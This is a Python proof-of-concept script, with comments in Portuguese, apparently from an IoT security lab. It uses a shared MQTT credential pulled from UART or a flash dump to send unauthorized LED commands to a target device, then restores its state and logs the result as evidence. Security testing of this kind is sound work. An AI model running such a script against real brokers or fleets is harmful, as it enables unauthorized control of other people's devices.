#!/usr/bin/env python3
"""
Etapa 6 - Demonstração controlada (somente na rede e na placa do laboratório).

Hipótese testada:
  "A credencial MQTT obtida pela UART (comando config) ou pelo dump da Flash é compartilhada
   e o broker não restringe tópicos por dispositivo. Logo, quem tem acesso físico a UMA unidade
   consegue enviar comandos para QUALQUER unidade da frota."

Passos que o script executa e registra:
  1. conecta no broker com a credencial informada (variáveis de ambiente, nunca no código)
  2. lê o status/telemetria atual do dispositivo-alvo
  3. publica {"led":"on"} no tópico de comando, espera a telemetria refletir led=on
  4. publica {"led":"off"} para restaurar o estado original
  5. salva um log com horários, tópicos, payloads e resultado esperado x observado

Uso (broker local, com a simulação do Wokwi rodando):
  $env:MQTT_USER="nexasense"; $env:MQTT_PASS="<valor obtido na UART com o comando config>"
  py scripts\\demo_controlled.py --root nexahome --device nexa-XXXXXX
"""
import argparse
import datetime as dt
import json
import os
import threading
import time
from pathlib import Path

import paho.mqtt.client as mqtt

ROOT = Path(__file__).resolve().parent.parent
EVID = ROOT / "findings" / "evidence"


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=1883)
    ap.add_argument("--root", default="nexahome", help="raiz de tópicos do firmware (LAB_TOPIC_ROOT)")
    ap.add_argument("--device", required=True, help="device id, ex.: nexa-000110 (aparece no boot log)")
    ap.add_argument("--wait", type=float, default=25, help="segundos esperando a telemetria refletir o comando")
    args = ap.parse_args()

    user, pw = os.environ.get("MQTT_USER"), os.environ.get("MQTT_PASS")
    if not user or not pw:
        raise SystemExit("Defina MQTT_USER e MQTT_PASS no ambiente (não coloque a senha no código).")

    EVID.mkdir(parents=True, exist_ok=True)
    out = EVID / f"demo_{dt.datetime.now():%Y%m%d_%H%M%S}.log"
    log = open(out, "w", encoding="utf-8")
    base = f"{args.root}/{args.device}"
    tele_topic, cmd_topic, status_topic = f"{base}/telemetry", f"{base}/cmd", f"{base}/status"
    last = {"led": None, "status": None}
    changed = threading.Event()

    def w(line):
        line = f"{dt.datetime.now().isoformat(timespec='seconds')}  {line}"
        print(line)
        log.write(line + "\n")
        log.flush()

    def on_message(c, u, msg):
        p = msg.payload.decode("utf-8", "replace")
        if msg.topic == status_topic:
            last["status"] = p
            w(f"STATUS {p}")
            return
        try:
            led = json.loads(p).get("led")
        except Exception:
            led = None
        w(f"TELEMETRIA led={led} {p}")
        if led != last["led"]:
            last["led"] = led
            changed.set()

    c = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, client_id=f"demo-{os.getpid()}")
    c.username_pw_set(user, pw)
    c.on_message = on_message
    w(f"# Demonstração controlada - broker {args.host}:{args.port} (sem TLS) - alvo {args.device}")
    w(f"# usuário MQTT usado: {user} (mesma credencial embutida no firmware de TODAS as unidades)")
    c.connect(args.host, args.port, 30)
    c.subscribe([(tele_topic, 0), (status_topic, 0)])
    c.loop_start()

    w("PASSO 1: aguardando estado inicial...")
    changed.wait(args.wait)
    initial = last["led"]
    w(f"estado inicial do LED: {initial}")

    # sempre provoca uma MUDANÇA observável e termina restaurando o estado inicial
    sequence = ("off", "on") if initial == "on" else ("on", "off")
    for target in sequence:
        changed.clear()
        payload = json.dumps({"led": target})
        w(f"PASSO: publicando {payload} em {cmd_topic}")
        c.publish(cmd_topic, payload)
        changed.wait(args.wait)
        ok = last["led"] == target
        w(f"esperado led={target} | observado led={last['led']} | {'CONFIRMADO' if ok else 'NAO CONFIRMADO'}")

    c.loop_stop()
    w("# Conclusão: o comando foi aceito sem qualquer autorização por dispositivo ou por mensagem."
      if last["led"] == sequence[-1] else "# Conclusão: verifique conexão/alvo; resultado inconclusivo.")
    log.close()
    print(f"\nEvidência: {out.relative_to(ROOT)}")


if __name__ == "__main__":
    main()
